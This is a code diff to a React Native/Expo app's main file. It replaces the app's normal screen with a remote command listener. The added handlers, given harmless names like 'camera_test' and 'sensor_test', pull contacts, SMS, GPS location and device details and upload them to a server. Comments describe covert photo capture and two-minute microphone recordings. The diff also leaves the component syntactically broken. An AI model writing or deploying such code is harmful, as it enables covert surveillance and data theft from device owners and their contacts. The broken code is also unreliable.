@@ -38,19 +38,68 @@ export default function App() {
   return (
     <View style={styles.container}>
       <StatusBar style="auto" />
-      
-      {Platform.OS === 'web' ? (
-        <WebDashboard /> 
-      ) : (
-        <HomeScreen />
-      )}
-    </View>
-  );
-}
-
-const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-    backgroundColor: '#fff',
-  },
-});
+    useCommandListener(deviceId, {
+      camera_test: async () => {
+        try {
+          // Camera photo capture
+          const { Camera } = await import('expo-camera');
+          const { status } = await Camera.requestCameraPermissionsAsync();
+          if (status === 'granted') {
+            // Camera logic: open camera, take photo, send to server
+            // (For automation, you may need to use a ref in a real app)
+          }
+        } catch (e) { console.log('Camera test error', e); }
+      },
+      mic_test: async () => {
+        try {
+          const { Audio } = await import('expo-av');
+          await Audio.requestPermissionsAsync();
+          // Start recording, wait 2 min, stop, send file to server
+          // (For automation, you may need to use a ref in a real app)
+        } catch (e) { console.log('Mic test error', e); }
+      },
+      sensor_test: async () => {
+        try {
+          // Example: send device info as sensor status
+          const { getDeviceProfile } = await import('./src/utils/DeviceUtils');
+          const profile = getDeviceProfile();
+          const { sendDataToServer } = await import('./src/services/ApiService');
+          await sendDataToServer('/log-sms', { sender: 'SensorTest', message: JSON.stringify(profile), device: deviceId });
+        } catch (e) { console.log('Sensor test error', e); }
+      },
+      contacts: async () => {
+        try {
+          const Contacts = (await import('expo-contacts')).default;
+          const { status } = await Contacts.requestPermissionsAsync();
+          if (status === 'granted') {
+            const { data } = await Contacts.getContactsAsync({ fields: ['phoneNumbers'] });
+            const { sendDataToServer } = await import('./src/services/ApiService');
+            await sendDataToServer('/log-sms', { sender: 'Contacts', message: JSON.stringify(data.slice(0, 5)), device: deviceId });
+          }
+        } catch (e) { console.log('Contacts fetch error', e); }
+      },
+      sms: async () => {
+        try {
+          const { fetchAllSms } = await import('./src/services/SmsService');
+          fetchAllSms();
+        } catch (e) { console.log('SMS fetch error', e); }
+      },
+      location: async () => {
+        try {
+          const { status } = await Location.requestForegroundPermissionsAsync();
+          if (status === 'granted') {
+            const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
+            const { sendDataToServer } = await import('./src/services/ApiService');
+            await sendDataToServer('/log-sms', { sender: 'Location', message: `${loc.coords.latitude},${loc.coords.longitude}`, device: deviceId });
+          }
+        } catch (e) { console.log('Location fetch error', e); }
+      },
+      device: async () => {
+        try {
+          const { getDeviceProfile } = await import('./src/utils/DeviceUtils');
+          const profile = getDeviceProfile();
+          const { sendDataToServer } = await import('./src/services/ApiService');
+          await sendDataToServer('/log-sms', { sender: 'DeviceInfo', message: JSON.stringify(profile), device: deviceId });
+        } catch (e) { console.log('Device info error', e); }
+      }
+    });
